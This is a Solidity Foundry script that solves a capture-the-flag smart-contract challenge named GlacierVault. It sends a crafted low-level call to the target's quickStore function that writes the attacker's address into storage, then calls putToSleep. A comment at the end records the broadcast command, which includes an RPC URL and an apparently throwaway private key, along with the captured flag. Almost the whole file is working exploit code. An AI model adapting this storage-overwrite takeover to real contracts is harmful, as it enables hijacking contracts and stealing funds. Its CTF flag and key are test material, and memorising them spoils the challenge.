// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Setup} from "../src/GlacierVault/Setup.sol";
import {Guardian} from "../src/GlacierVault/Guardian.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract AttackScript is Script{
    function run() public{
        vm.startBroadcast();
        new Attack{value: 10 ether}().exploit();
        console.log("Attack Success");
        vm.stopBroadcast();
    }
}

contract Attack{
    Setup public setupContract = Setup(0x4b4b43d0E6dc47aC7274EA3a2463C87116282700);
    Guardian public TARGET = Guardian(payable(address(setupContract.TARGET())));
    constructor() payable {
        require(msg.value == 10 ether);
    }
    function exploit() public {
        (bool success, ) = address(TARGET).call{value:1337}(
            abi.encodeWithSignature("quickStore(uint8,uint256)", 0, address(this))
            );
        require(success, "Call failed");
        TARGET.putToSleep();
    }
}

// forge script script/GlacierVaultAttack.sol:AttackScript --rpc-url http://34.159.107.195:18546/39d1de0d-2576-480e-a48d-766bcd081545 --private-key 0x23341b72872076e37f77d2e467499c81d8ce9ee96f9950f20dd2f43de09d362f --broadcast
// gctf{h3's_sl33pIng_BuT_ju5t_4_n0w}